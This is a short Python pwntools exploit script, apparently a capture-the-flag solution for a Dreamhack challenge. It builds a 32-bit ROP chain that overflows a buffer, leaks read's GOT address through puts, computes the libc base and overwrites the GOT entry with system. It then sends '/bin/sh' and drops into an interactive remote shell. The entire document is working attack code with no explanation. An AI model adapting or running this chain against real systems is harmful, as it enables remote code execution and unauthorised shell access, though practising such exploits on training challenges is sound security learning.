from pwn import *

r = remote("host3.dreamhack.games", 23861)


libc = ELF("./libc.so.6")
# gadget
pr = 0x0804868b
pppr = 0x08048689


# plt, got
puts_plt = 0x8048420
read_plt = 0x80483f0
read_got = 0x804a00c





payload = b''

payload += b'A' * 72

# puts(read_got)
payload += p32(puts_plt)
payload += p32(pr)
payload += p32(read_got)


# read(0, read_got, 12)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0x0)
payload += p32(read_got)
payload += p32(12)

# read("/bin/sh\x00") == system("/bin/sh\x00")
payload += p32(read_plt)
payload += p32(pr)
payload += p32(read_got + 0x4)

r.send(payload)

r.recvn(64)
read = r.recv(4)
read = u32(read)

lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]

r.sendline(p32(system) + b"/bin/sh\x00")



r.interactive()